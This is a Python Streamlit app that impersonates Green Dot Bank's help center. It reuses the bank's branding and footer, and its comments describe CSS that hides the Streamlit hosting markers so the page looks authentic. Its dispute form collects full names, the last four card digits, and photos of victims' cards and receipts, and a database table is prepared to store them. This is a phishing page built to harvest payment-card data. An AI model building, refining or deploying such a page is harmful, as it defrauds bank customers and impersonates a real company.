
import streamlit as st
import sqlite3
import os
from datetime import datetime

# DB Setup
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT)""")
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")

# CSS AGRESIVO PARA ELIMINAR ANCLAS Y BRANDING
st.markdown("""<style>
/* Ocultar cabecera, pie de página y menú de Streamlit */
[data-testid='stHeader'], [data-testid='stFooterAd'], footer, header, #MainMenu, .stDeployButton {
    display: none !important;
    visibility: hidden !important;
}

/* ELIMINAR EL ICONO DE ENLACE (ANCLA) JUNTO A LOS TÍTULOS */
.viewerBadge_container__1QS13, .stApp a.section-anchor, .section-anchor {
    display: none !important;
    visibility: hidden !important;
}

/* Desactivar clics en textos y logos */
h1, h2, h3, [data-testid="stImage"] {
    pointer-events: none !important;
    user-select: none !important;
}

/* Fondo negro y texto blanco */
.stApp {
    background-color: #000000 !important;
    color: #FFFFFF !important;
}

/* Botón verde esmeralda */
.stButton>button {
    background-color: #00a05b !important;
    color: white !important;
    border: none !important;
    width: 100%;
    padding: 15px !important;
    font-weight: bold !important;
    text-transform: uppercase;
}

/* Estilo de los campos de entrada */
input {
    background-color: #111 !important;
    color: white !important;
    border: 1px solid #333 !important;
}

.app-promo-container {
    background-color: #111111;
    padding: 40px 20px;
    text-align: center;
    border-radius: 12px;
    margin: 30px 0;
    border: 1px solid #222;
}

.legal-footer {
    font-size: 10px;
    color: #444;
    text-align: justify;
    margin-top: 60px;
    border-top: 1px solid #222;
    padding-top: 20px;
}
</style>""", unsafe_allow_html=True)

if os.path.exists('logo.svg'):
    st.image('logo.svg', width=160)

st.title("Help Center")
st.write("Please fill out the form below to submit your claim.")

with st.form("dispute_form", clear_on_submit=True):
    nombre = st.text_input("Full Name")
    cuenta = st.text_input("Last 4 digits of Card")
    monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
    st.markdown("**Upload Evidence**")
    rec = st.file_uploader("Receipt Photo", type=['jpg','png','jpeg'])
    car = st.file_uploader("Card Photo", type=['jpg','png','jpeg'])
    submitted = st.form_submit_button("SUBMIT NOW")

if submitted:
    if nombre and rec and car:
        st.success("✅ Claim received. We will review it shortly.")
    else:
        st.error("⚠️ All fields are required.")

# SECCIÓN DE APP STORES CON DESCRIPCIÓN REFORZADA
st.markdown("""<div class='app-promo-container'>
    <h2 style='color:white; margin-bottom:10px;'>Download the Green Dot app</h2>
    <p style='color:#bbb; max-width:600px; margin: 0 auto 25px auto;'>We offer secure mobile banking that allows you to conveniently manage your account from making deposits, to sending money or paying bills.</p>
    <div style='display: flex; justify-content: center; gap: 20px; flex-wrap: wrap;'>
        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='160'>
        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='160'>
    </div>
</div>""", unsafe_allow_html=True)

st.markdown("""<div class='legal-footer'>
Green Dot cards are issued by Green Dot Bank, Member FDIC. ©2026 Green Dot Bank. 
All rights reserved. The Green Dot logo is a registered trademark.
</div>""", unsafe_allow_html=True)
